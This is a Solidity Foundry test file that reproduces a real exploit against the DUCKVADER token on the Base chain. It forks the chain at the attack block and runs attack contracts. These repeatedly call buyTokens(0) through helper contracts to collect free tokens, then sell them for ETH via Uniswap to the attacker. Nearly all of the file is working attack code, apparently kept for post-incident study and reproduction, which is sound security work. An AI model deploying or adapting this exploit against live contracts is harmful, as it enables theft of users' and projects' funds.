// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~ 5 ETH
// Attacker : https://basescan.org/address/0x2383a550e40a61b41a89da6b91d8a4a2452270d0
// Attack Contract : https://basescan.org/address/0x652f9ac437a870ce273a0be9d7e7ee03043a91ff
// Vulnerable Contract : https://basescan.org/address/0xaa8f35183478b8eced5619521ac3eb3886e98c56
// Attack Tx : https://basescan.org/tx/0x9bb1401233bb9172ede2c3bfb924d5d406961e6c63dee1b11d5f3f79f558cae4

// @Info
// Vulnerable Contract Code : https://basescan.org/address/0xaa8f35183478b8eced5619521ac3eb3886e98c56#code

// @Analysis
// Post-mortem : N/A
// Twitter Guy : https://x.com/TenArmorAlert/status/1899378096056201414
// Hacking God : N/A

address constant DUCKVADER = 0xaa8f35183478B8EcEd5619521Ac3Eb3886E98c56;
address constant wETH = 0x4200000000000000000000000000000000000006;
address constant UNISWAP_ROUTER = 0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24;

contract DUCKVADER_exp is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 27_445_835 - 1;

    function setUp() public {
        vm.createSelectFork("base", blocknumToForkFrom);
        vm.label(DUCKVADER, "DUCKVADER");
        vm.label(UNISWAP_ROUTER, "Uniswap: V2 Router02");
    }

    function testExploit() public balanceLog {
        AttackContract attackContract = new AttackContract();
        attackContract.attack();
    }

    receive() external payable {
        // This contract is used to receive ETH from the attack contract
    }
}

contract AttackContract {
    address attacker;

    constructor() {
        attacker = msg.sender;
    }

    function attack() external {
        // Call multiple times to get more tokens
        uint256 times = 10; //200;
        for (uint256 i = 0; i < times; i++) {
            AttackContract2 attackContract2 = new AttackContract2();
            attackContract2.buy();
        }
        IDUCKVADER(DUCKVADER).buyTokens(0);
        IDUCKVADER(DUCKVADER).approve(UNISWAP_ROUTER, type(uint256).max);
        uint256 balance = IDUCKVADER(DUCKVADER).balanceOf(address(this));
        // console.log(balance);
        address[] memory path = new address[](2);
        path[0] = address(DUCKVADER);
        path[1] = address(wETH);
        IRouter(payable(UNISWAP_ROUTER)).swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance, 0, path, attacker, block.timestamp + 10
        );
    }
}

contract AttackContract2 {
    function buy() external {
        IDUCKVADER(DUCKVADER).buyTokens(0);
        uint256 balance = IDUCKVADER(DUCKVADER).balanceOf(address(this));
        IDUCKVADER(DUCKVADER).transfer(msg.sender, balance);
    }
}

interface IDUCKVADER is IERC20 {
    function buyTokens(uint256 usdtAmount) external payable;
}
